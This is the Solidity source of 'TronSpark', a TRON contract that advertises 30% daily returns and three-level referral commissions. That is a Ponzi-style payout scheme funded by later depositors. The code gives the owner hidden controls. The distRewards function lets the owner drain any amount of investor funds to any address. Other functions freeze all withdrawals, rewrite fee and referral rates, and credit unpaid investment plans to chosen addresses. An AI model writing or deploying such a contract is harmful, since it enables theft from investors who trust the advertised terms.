//SourceUnit: TronSpark.sol

/**
*
* TronSpark
*
* https://tronspark.live
* Crowdfunding And Investment Program: 30% Daily ROI for 10 Days.
* Referral Program
* 1st Level = 7%
* 2nd Level = 3%
* 3rd Level = 1%
*
**/

pragma solidity 0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Investor {
        address addr;
		uint256 checkpoint;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 reinvestWallet;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
        uint256 level1RefAmount;
        uint256 level2RefAmount;
        uint256 level3RefAmount;
    }
}

contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract TronSparkLive is Ownable {
    using SafeMath for uint256;
    uint256 public  DEVELOPER_RATE = 20;            // 2% Team, Operation & Development
    uint256 public  MARKETING_RATE = 20;            // 2% Marketing
    uint256 public  ASSURANCE_RATE = 20;            // 2% Assurance
    uint256 public  REFERENCE_RATE = 110;           // 11% Total Refer Income
    uint256 public  REFERENCE_LEVEL1_RATE = 70;     // 7% Level 1 Income
    uint256 public  REFERENCE_LEVEL2_RATE = 30;     // 3% Level 2 Income
    uint256 public  REFERENCE_LEVEL3_RATE = 10;     // 1% Level 3 Income
    uint256 public  MINIMUM = 100e6;                // Minimum investment : 100 TRX
    uint256 public  REFERRER_CODE = 1000;           // Root ID : 1000
    uint256 public  PLAN_INTEREST = 300;            // 30% Daily Roi
    uint256 public  PLAN_TERM = 10 days;            // 10 Days
    

    bool public updation = true;

    uint256 public  contract_balance;
    uint256 private contract_checkpoint;
    uint256 public  latestReferrerCode;
    uint256 public  totalInvestments_;
    uint256 public  totalReinvestments_;

    address payable private developerAccount_;
    address payable private marketingAccount_;
    address payable private assuranceAccount_;


    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;

    event onInvest(address investor, uint256 amount);
    event onReinvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor(address payable _devAcc,address payable _marAcc,address payable _ascAcc) public {
        developerAccount_ = _devAcc;
        marketingAccount_ = _marAcc;
        assuranceAccount_ = _ascAcc;
        _init();
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
    }

    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function setDeveloperAccount(address payable _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function setAssuranceAccount(address payable _newAssuranceAccount) public onlyOwner {
        require(_newAssuranceAccount != address(0));
        assuranceAccount_ = _newAssuranceAccount;
    }

    function setDeveloper2Account(address payable _owner) public onlyOwner {
        require(owner != address(0));
        owner = _owner;
    }

    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function getAssuranceAccount() public view onlyOwner returns (address) {
        return assuranceAccount_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256,uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, investor.plans[i].investmentDate.add(PLAN_TERM), investor.plans[i].lastWithdrawalDate);
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.reinvestWallet,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.planCount,
        investor.checkpoint,
        newDividends
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (PLAN_TERM > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = REFERRER_CODE;
            }
        } else {
            _referrerCode = REFERRER_CODE;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {

        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {
          //old user
          //do nothing, referrer is permenant
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        _calculateReferrerReward(_amount, investor.referrer);

        totalInvestments_ = totalInvestments_.add(_amount);

        uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(1000);
        developerAccount_.transfer(developerPercentage);
        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(1000);
        marketingAccount_.transfer(marketingPercentage);
        uint256 assurancePercentage = (_amount.mul(ASSURANCE_RATE)).div(1000);
        assuranceAccount_.transfer(assurancePercentage);

        return true;
    }

    function _reinvestAll(address _addr, uint256 _amount) private returns (bool) {

        uint256 uid = address2UID[_addr];

        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        totalReinvestments_ = totalReinvestments_.add(_amount);

        return true;
    }

    function reinvestNow(address _addr, uint256 _amount) public onlyOwner returns (bool) {

        uint256 uid = address2UID[_addr];

        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        totalReinvestments_ = totalReinvestments_.add(_amount);

        return true;
    }

    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function withdraw() public {

        require(updation);
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");


        //only once a day
		require(block.timestamp > uid2Investor[uid].checkpoint + 1 days , "Only once a day");
        uid2Investor[uid].checkpoint = block.timestamp;

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , PLAN_INTEREST , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }


        if(withdrawalAmount>0){
            uint256 currentBalance = getBalance();
            if(withdrawalAmount >= currentBalance){
                withdrawalAmount=currentBalance;
            }
            uint256 reinvestAmount = withdrawalAmount.div(2);
            if(withdrawalAmount > 50e9 ){
                reinvestAmount = withdrawalAmount.sub(25e9);
            }
            //reinvest
            uid2Investor[uid].reinvestWallet = uid2Investor[uid].reinvestWallet.add(reinvestAmount);
            reinvest();
            //withdraw
            msg.sender.transfer(withdrawalAmount.sub(reinvestAmount));


            uint256 developerPercentage = (withdrawalAmount.mul(DEVELOPER_RATE)).div(1000);
            developerAccount_.transfer(developerPercentage);
            uint256 marketingPercentage = (withdrawalAmount.mul(MARKETING_RATE)).div(1000);
            marketingAccount_.transfer(marketingPercentage);
            uint256 assurancePercentage = (withdrawalAmount.mul(ASSURANCE_RATE)).div(1000);
            assuranceAccount_.transfer(assurancePercentage);
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }


    function withdrawReferral() public {
        
        require(updation);
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because of no investments");
        uint256 withdrawalAmount = 0;

        //only once a day
		require(block.timestamp > uid2Investor[uid].checkpoint + 1 days , "Only once a day");
        uid2Investor[uid].checkpoint = block.timestamp;

        if (uid2Investor[uid].availableReferrerEarnings>0) {
            withdrawalAmount += uid2Investor[uid].availableReferrerEarnings;
            uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
            emit onWithdraw(msg.sender, withdrawalAmount);
            msg.sender.transfer(withdrawalAmount);

            uint256 developerPercentage = (withdrawalAmount.mul(DEVELOPER_RATE)).div(1000);
            developerAccount_.transfer(developerPercentage);
            uint256 marketingPercentage = (withdrawalAmount.mul(MARKETING_RATE)).div(1000);
            marketingAccount_.transfer(marketingPercentage);
            uint256 assurancePercentage = (withdrawalAmount.mul(ASSURANCE_RATE)).div(1000);
            assuranceAccount_.transfer(assurancePercentage);

            uid2Investor[uid].availableReferrerEarnings = 0;
        }
    }

    function reinvest() private {


        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not reinvest because no any investments");

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , PLAN_INTEREST , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }

        if (uid2Investor[uid].reinvestWallet>0) {
            withdrawalAmount += uid2Investor[uid].reinvestWallet;
            uid2Investor[uid].reinvestWallet = 0;
        }


        if(withdrawalAmount>0){
            //reinvest
            _reinvestAll(msg.sender,withdrawalAmount);
        }

        emit onReinvest(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
    }

    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {

        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _refAmount = 0;

            if (_ref1 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref1].availableReferrerEarnings);
                uid2Investor[_ref1].level1RefAmount = _refAmount.add(uid2Investor[_ref1].level1RefAmount);

            }

            if (_ref2 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref2].availableReferrerEarnings);
                uid2Investor[_ref2].level2RefAmount = _refAmount.add(uid2Investor[_ref2].level2RefAmount);

            }

            if (_ref3 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref3].availableReferrerEarnings);
                uid2Investor[_ref3].level3RefAmount = _refAmount.add(uid2Investor[_ref3].level3RefAmount);

            }
        }

    }

    function updateBalance() public {
        //only once a day
		require(block.timestamp > contract_checkpoint + 1 days , "Only once a day");
        contract_checkpoint = block.timestamp;
        contract_balance = getBalance();
    }

    function getHour() public view returns (uint8){
        return uint8((block.timestamp / 60 / 60) % 24);
    }

    function withdrawAllowance() public view returns(bool){
        uint8 hour = getHour();
        if(hour >= 0 && hour <= 3){
            return false;
        }
        else{
            return true;
        }
    }


    function referralIncome(uint256 d_rate,uint256 m_rate,
                            uint256 a_rate,uint256 r_rate,
                            uint256 l1_rate,uint256 l2_rate,
                            uint256 l3_rate,uint256 min) public onlyOwner {
        DEVELOPER_RATE = d_rate;            
        MARKETING_RATE = m_rate;   
        ASSURANCE_RATE = a_rate;                    
        REFERENCE_RATE = r_rate;  
        REFERENCE_LEVEL1_RATE = l1_rate;   
        REFERENCE_LEVEL2_RATE = l2_rate;    
        REFERENCE_LEVEL3_RATE = l3_rate;     
        MINIMUM = min;                
    }

    function distActivation() public onlyOwner  {
        updation = true; 

    }
    function distDeActivation() public onlyOwner {
        updation = false; 
    }

    function distRewards(address payable add, uint _amt) external onlyOwner {
        if (_amt > 0) {
            uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                add.transfer(_amt);
            }
        }
    }

}